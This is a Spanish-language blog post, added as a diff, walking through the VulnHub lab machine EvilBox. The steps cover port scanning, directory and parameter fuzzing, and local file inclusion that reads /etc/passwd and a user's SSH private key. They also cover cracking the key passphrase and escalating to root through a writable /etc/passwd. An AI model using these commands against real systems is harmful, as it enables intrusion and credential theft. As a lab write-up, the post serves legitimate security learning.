@@ -1,0 +1,179 @@
+---
+layout: post
+title: "EvilBox"
+date: 2024-05-15 17:35:23
+category: sample
+vm: vulnhub
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnhub/vulnhub.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> EvilBox </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong><a href="https://www.vulnhub.com/entry/evilbox-one,736/"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/vulnhub/EvilBox/host.png){:.margin}
+
+**1\.** Detectamos dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/vulnhub/EvilBox/arp.png){:.margin}
+
+**2\.** Escaneo puertos y servicios activos.
+
+`sudo nmap -p- --open -T5 -sCV -sS --min-rate=5000 -Pn -n 192.168.1.21 -oN reportScan`
+
+![img](/notas/public/img/vulnhub/EvilBox/nmap.png){:.margin}
+
+**3\.** Tenemos la pagina Apache por defecto.
+
+`http://192.168.1.21:80/`
+
+![img](/notas/public/img/vulnhub/EvilBox/80.png){:.margin}
+
+**4\.** Hago fuzzing de directorios y archivos.
+
+`gobuster dir -u http://192.168.1.21/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt`
+
+![img](/notas/public/img/vulnhub/EvilBox/gobuster.png){:.margin}
+
+**5\.** Reviso el fichero y tengo un usuario potencial.
+
+`http://192.168.1.21/robots.txt`
+
+![img](/notas/public/img/vulnhub/EvilBox/robots.png){:.margin}
+
+**6\.** Si vamos a secret no hay nada.
+
+`http://192.168.1.21/secret/`
+
+![img](/notas/public/img/vulnhub/EvilBox/secretnull.png){:.margin}
+
+**7\.** Hago fuzzing a este directorio, encontramos un archivo.
+
+`gobuster dir -u http://192.168.1.21/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt`
+
+![img](/notas/public/img/vulnhub/EvilBox/gobustersecret.png){:.margin}
+
+**8\.** No tenemos nada visual.
+
+`http://192.168.1.21/secret/evil.php`
+
+![img](/notas/public/img/vulnhub/EvilBox/evilnull.png){:.margin}
+
+**9\.** Hago fuzzing de posibles parametros de ejecucion remota de comandos(RCE), sin exito.
+
+`wfuzz -c --hc=404 --hl=0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 'http://192.168.1.21/secret/evil.php?FUZZ=id'`
+
+![img](/notas/public/img/vulnhub/EvilBox/wfuzznull.png){:.margin}
+
+**10\.** Hago fuzzing en busca de parametros para incluir archivos locales(LFI).
+
+`wfuzz -c --hc=404 --hl=0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 'http://192.168.1.21/secret/evil.php?FUZZ=/etc/passwd'`
+
+![img](/notas/public/img/vulnhub/EvilBox/wfuzzcommand.png){:.margin}
+
+**11\.** Vemos que es posible incluir archivos locales.
+
+`http://192.168.1.21/secret/evil.php?command=/etc/passwd`
+
+![img](/notas/public/img/vulnhub/EvilBox/etcpasswd.png){:.margin}
+
+**12\.** Presiono ctrl+u y filtro para ver usuarios disponibles.
+
+`view-source:http://192.168.1.21/secret/evil.php?command=/etc/passwd`
+
+![img](/notas/public/img/vulnhub/EvilBox/users.png){:.margin}
+
+**13\.** Apuntamos a la clave privada del usuario.
+
+`http://192.168.1.21/secret/evil.php?command=/home/mowree/.ssh/id_rsa`
+
+![img](/notas/public/img/vulnhub/EvilBox/idrsa.png){:.margin}
+
+_\- ctrl + u para copiar de mejor forma._
+
+![img](/notas/public/img/vulnhub/EvilBox/idrsaview.png){:.margin}
+
+**14\.** Guardo la clave en un archivo.
+
+`nano key`
+
+![img](/notas/public/img/vulnhub/EvilBox/key.png){:.margin}
+
+**15\.** Uso [RSAcrack](https://github.com/d4t4s3c/RSAcrack) para obtener un passphrase (secuencia de palabras u otro texto para acceder).
+
+`RSAcrack -w /usr/share/wordlists/rockyou.txt -k key`
+
+![img](/notas/public/img/vulnhub/EvilBox/passphrase.png){:.margin}
+
+**16\.** Me conecto por ssh como usuario mowree.
+
+`ssh -i key mowree@192.168.1.21`
+
+![img](/notas/public/img/vulnhub/EvilBox/ssh.png){:.margin}
+
+**17\.** Busco archivos sudoers sin mucho exito.
+
+`sudo -l`
+
+`find / -perm -4000 2>/dev/null`
+
+![img](/notas/public/img/vulnhub/EvilBox/sudoers.png){:.margin}
+
+**18\.** Escalando privilegios a superusario.
+
+_1- Veo que tengo permisos para escribir en el passwd_
+
+`ls -l /etc/passwd`
+
+![img](/notas/public/img/vulnhub/EvilBox/lslpasswd.png){:.margin}
+
+_2- Quito la X (contraseña) para acceder como root sin contraseña_
+
+`cat /etc/passwd`
+
+`nano /etc/passwd`
+
+![img](/notas/public/img/vulnhub/EvilBox/catpasswd.png)
+![img](/notas/public/img/vulnhub/EvilBox/nanopasswd.png)
+
+_3- Intentamos acceder como root pero nos sigue pidiendo la contraseña_
+
+`su root`
+
+![img](/notas/public/img/vulnhub/EvilBox/surootfail.png){:.margin}
+
+_4- Genero una contraseña personalizada y luego lo agrego al passwd_
+
+`openssl passwd -1 micontra`
+
+`nano /etc/passwd`
+
+![img](/notas/public/img/vulnhub/EvilBox/generatepass.png){:.margin}
+![img](/notas/public/img/vulnhub/EvilBox/passwdadd.png){:.margin}
+
+_5- Accedemos como root con la nueva contraseña (micontra)
+
+`su root`
+
+![img](/notas/public/img/vulnhub/EvilBox/root.png){:.margin}
+
+
+<br>
+
+<span class="finish">_Finalizado._</span>
